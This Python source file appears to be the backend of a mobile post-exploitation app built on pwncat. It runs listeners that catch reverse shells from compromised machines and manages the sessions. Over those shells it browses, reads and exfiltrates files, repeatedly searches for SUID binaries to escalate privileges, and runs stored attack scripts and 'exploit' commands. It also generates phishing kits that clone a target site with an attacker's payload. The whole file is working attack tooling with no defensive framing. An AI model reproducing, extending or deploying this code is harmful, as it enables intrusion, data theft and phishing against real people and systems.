import base64
import json
import logging
import os
import re
import threading
import time
from collections import deque
from queue import Queue, Empty
from urllib.parse import urlparse

import makephish
import pwncat

# --- Globals ---
listeners = {}
sessions = {}
scripts = {}
next_listener_id = 0
next_session_id = 0
sessions_lock = threading.Lock()
scripts_lock = threading.Lock()
log = logging.getLogger("pwncat")

# --- Persistence ---
SCRIPTS_FILE = "chorus_scripts.json"


def _load_scripts_from_disk():
    global scripts
    with scripts_lock:
        if os.path.exists(SCRIPTS_FILE):
            try:
                with open(SCRIPTS_FILE, "r") as f:
                    scripts = json.load(f)
                    log.info(f"Loaded {len(scripts)} scripts from {SCRIPTS_FILE}")
            except Exception as e:
                log.error(f"Error loading scripts from disk: {e}")
                scripts = {}
        else:
            scripts = {}


def _save_scripts_to_disk():
    with scripts_lock:
        try:
            with open(SCRIPTS_FILE, "w") as f:
                json.dump(scripts, f, indent=4)
        except Exception as e:
            log.error(f"Error saving scripts to disk: {e}")


# --- Helper Functions ---
def parse_ls_output(output: str):
    items = []
    ls_pattern = re.compile(
        r"^(?P<type>[d\-l])(?P<perms>.{9})\s+"
        r"(?P<links>\d+)\s+"
        r"(?P<owner>\S+)\s+"
        r"(?P<group>\S+)\s+"
        r"(?P<size>\d+)\s+"
        r"(?P<date>\d{4}-\d{2}-\d{2})\s+"
        r"(?P<time>\d{2}:\d{2})\s+"
        r"(?P<name>.+)"
    )
    for line in output.strip().splitlines():
        match = ls_pattern.match(line.strip())
        if match:
            details = match.groupdict()
            name_part = details['name']
            name = name_part.split(' -> ')[0] if ' -> ' in name_part else name_part
            items.append({"name": name, "path": name, "is_dir": details['type'] == 'd'})
    return items


# --- Session Management Classes ---
class PwncatSession:
    def __init__(self, session_id, client_address):
        self.id = session_id
        self.platform = "linux"
        self.client_address = client_address
        self.terminal_buffer = deque(maxlen=2048)
        self.terminal_listener = None
        self.enumeration_listener = None
        self.command_queue = deque()
        self.utility_queue = Queue()
        self.utility_result = None
        self.utility_marker = None
        self.ssig = pwncat.InterruptHandler(True, False)
        enc = pwncat.StringEncoder()
        self.proc = pwncat.IOCommand(self.ssig, pwncat.DsIOCommand(enc, "/bin/sh", -1))
        self.known_loot = set()
        self.known_privesc = set()
        threading.Thread(target=self.proc_to_session_loop, daemon=True).start()
        threading.Thread(target=self.session_to_proc_loop, daemon=True).start()

    def start_enumeration(self, listener):
        self.enumeration_listener = listener
        threading.Thread(target=self.enumeration_loop, daemon=True).start()

    def enumeration_loop(self):
        time.sleep(5)
        while not self.ssig.has_terminate():
            # Find SUID binaries
            output = self.execute_utility_command("find / -perm -u=s -type f 2>/dev/null")
            if output:
                for line in output.strip().splitlines():
                    if line and line not in self.known_privesc:
                        self.known_privesc.add(line)
                        if self.enumeration_listener: self.enumeration_listener.onNewPrivescFinding(
                            {"name": f"SUID: {line.split('/')[-1]}", "description": line,
                             "exploit_id": line})
            time.sleep(60)

    def proc_to_session_loop(self):
        output_buffer = ""
        for data in self.proc.producer():
            decoded_data = pwncat.StringEncoder.decode(data)
            if self.utility_marker and self.utility_marker in decoded_data:
                output_buffer += decoded_data.split(self.utility_marker)[0]
                self.utility_result = output_buffer
                output_buffer = ""
            elif self.utility_marker is not None:
                output_buffer += decoded_data
            else:
                if self.terminal_listener:
                    try:
                        self.terminal_listener.onOutput(decoded_data)
                    except Exception:
                        pass
                self.terminal_buffer.append(data)

    def session_to_proc_loop(self):
        while not self.ssig.has_terminate():
            try:
                command = self.utility_queue.get_nowait()
                self.proc.consumer(command)
            except Empty:
                if self.command_queue:
                    command = self.command_queue.popleft()
                    self.proc.consumer(command)
                else:
                    time.sleep(0.05)

    def execute_utility_command(self, command: str) -> str:
        marker = f"END_MARKER_{int(time.time())}"
        full_command = f"{command}; echo {marker}\n"
        self.utility_marker = marker
        self.utility_result = None
        self.utility_queue.put(pwncat.StringEncoder.encode(full_command))
        start_time = time.time()
        while self.utility_result is None and not self.ssig.has_terminate():
            if time.time() - start_time > 30:
                self.utility_marker = None
                return None
            time.sleep(0.1)
        result, self.utility_marker, self.utility_result = self.utility_result, None, None
        return result

    def send_interactive_command(self, command_bytes: bytes):
        self.command_queue.append(command_bytes)


class SessionIO(pwncat.IO):
    def __init__(self, ssig):
        super(SessionIO, self).__init__(ssig)
        self.active_session = None

    def producer(self, *args, **kwargs):
        yield from ()

    def consumer(self, data):
        global next_session_id
        if self.active_session is None:
            with sessions_lock:
                session_id = next_session_id
                addr_info = self.net_instance.net._Net__active
                addr_str = f"{addr_info['remote_addr']}:{addr_info['remote_port']}"
                self.active_session = PwncatSession(session_id, addr_str)
                sessions[session_id] = self.active_session
                next_session_id += 1
        self.active_session.send_interactive_command(data)

    def interrupt(self):
        if self.active_session: self.active_session.ssig.raise_terminate()


# --- API Functions ---
def initialize_manager():
    logging.getLogger("pwncat").setLevel(logging.CRITICAL)
    _load_scripts_from_disk()

def create_listener(uri: str):
    global next_listener_id
    try:
        proto, _, host_port = uri.partition("://")
        host, _, port_str = host_port.rpartition(":")
        port = int(port_str)
        is_udp = proto.lower() == "udp"
        ssig = pwncat.InterruptHandler(True, False)
        sock_opts = pwncat.DsIONetworkSock(8192, 0, 0.05, 1, False, False, False, None, None,
                                           is_udp, False, "", None, "")
        srv_opts = pwncat.DsIONetworkSrv(True, -1, 1.0, [])
        net = pwncat.IONetwork(ssig, pwncat.StringEncoder(), host, [port], "server", srv_opts,
                               pwncat.DsIONetworkCli(-1, 1.0, []), sock_opts)
        session_io = SessionIO(ssig)
        session_io.net_instance = net
        run = pwncat.Runner(ssig, False, pwncat.PSEStore(ssig, [net]))
        run.add_action("NET_TO_SESSION_IO",
                       pwncat.DsRunnerAction(pwncat.DsCallableProducer(net.producer),
                                             session_io.consumer, [net.interrupt], [], False, None))
        thread = threading.Thread(target=run.run, daemon=True, name=f"Listener-{next_listener_id}")
        thread.start()
        listeners[next_listener_id] = {"id": next_listener_id, "uri": uri, "thread": thread,
                                       "ssig": ssig}
        next_listener_id += 1
        return {"id": listeners[next_listener_id - 1]["id"], "uri": uri}
    except Exception as e:
        return {"error": str(e)}


def list_files(session_id: int, path: str):
    with sessions_lock:
        if session_id in sessions:
            out = sessions[session_id].execute_utility_command(
                f"ls -lA --time-style=long-iso \"{path}\"")
            if out:
                items = parse_ls_output(out)
                for item in items: item[
                    'path'] = f"{path.rstrip('/')}/{item['name']}" if path != "/" else f"/{item['name']}"
                return items
    return []


def read_file(session_id: int, path: str):
    with sessions_lock:
        if session_id in sessions:
            content = sessions[session_id].execute_utility_command(f"cat \"{path}\"")
            return {"content": content} if content is not None else {"error": "Failed to read file"}
    return {"error": "Session not found"}


def download_file(session_id: int, remote_path: str, local_path: str):
    with sessions_lock:
        if session_id not in sessions: return {"error": "Session not found"}
        session = sessions[session_id]
    b64_content = session.execute_utility_command(
        f"base64 \"{remote_path}\" 2>/dev/null || echo FAILED")
    if b64_content and "FAILED" not in b64_content:
        try:
            with open(local_path, "wb") as f:
                f.write(base64.b64decode("".join(b64_content.strip().splitlines())))
            return {"path": local_path}
        except Exception as e:
            return {"error": f"Failed to write file: {e}"}
    return {"error": f"Failed to read remote file"}


def generate_phishing_site(target_url: str, payload: str):
    # This path is relative to the Chaquopy python root
    output_dir = f"./phish_kits/{urlparse(target_url).netloc}"
    return makephish.generate_phishing_site(target_url, payload, output_dir)


# ... all other API functions ...
def get_listeners(): return [{"id": l["id"], "uri": l["uri"]} for l in listeners.values()]
def remove_listener(listener_id: int):
    if listener_id in listeners:
        listeners[listener_id]["ssig"].raise_terminate()
        del listeners[listener_id]
def get_sessions():
    with sessions_lock:
        dead = [sid for sid, s in sessions.items() if s.proc.proc.poll() is not None]
        for sid in dead: del sessions[sid]
        return [{"id": s.id, "platform": s.platform} for s in sessions.values()]
def start_interactive_session(session_id: int, callback):
    with sessions_lock:
        if session_id in sessions:
            s = sessions[session_id]
            s.terminal_listener = callback
            for item in list(s.terminal_buffer): callback.onOutput(
                pwncat.StringEncoder.decode(item))
        elif callback:
            callback.onClose()
def send_to_terminal(session_id: int, command: str):
    with sessions_lock:
        if session_id in sessions: sessions[session_id].send_interactive_command(
            pwncat.StringEncoder.encode(command))
def start_persistent_enumeration(session_id: int, listener):
    with sessions_lock:
        if session_id in sessions: sessions[session_id].start_enumeration(listener)
def run_exploit(session_id: int, exploit_id: str):
    with sessions_lock:
        if session_id in sessions:
            output = sessions[session_id].execute_utility_command(exploit_id)
            return {"output": output} if output is not None else {
                "error": f"Failed to run exploit: {exploit_id}"}
    return {"error": "Session not found"}
def save_script(name: str, content: str):
    with scripts_lock: scripts[name] = content
    _save_scripts_to_disk()
    return {"status": "success"}
def delete_script(name: str):
    with scripts_lock:
        if name in scripts: del scripts[name]
    _save_scripts_to_disk()
    return {"status": "success"}
def get_scripts():
    with scripts_lock: return [{"name": name} for name in scripts.keys()]
def get_script_content(name: str):
    with scripts_lock:
        content = scripts.get(name)
        return {"name": name, "content": content} if content is not None else {
            "error": "Script not found"}
def run_script(session_id: int, script_name: str):
    with scripts_lock:
        if script_name not in scripts: return {"error": f"Script '{script_name}' not found."}
        content = scripts[script_name]
    with sessions_lock:
        if session_id not in sessions: return {"error": f"Session {session_id} not found."}
        session = sessions[session_id]
    for command in content.strip().splitlines():
        if command:
            session.send_interactive_command(pwncat.StringEncoder.encode(command + "\n"))
            time.sleep(0.2)
    return {"status": "success"}
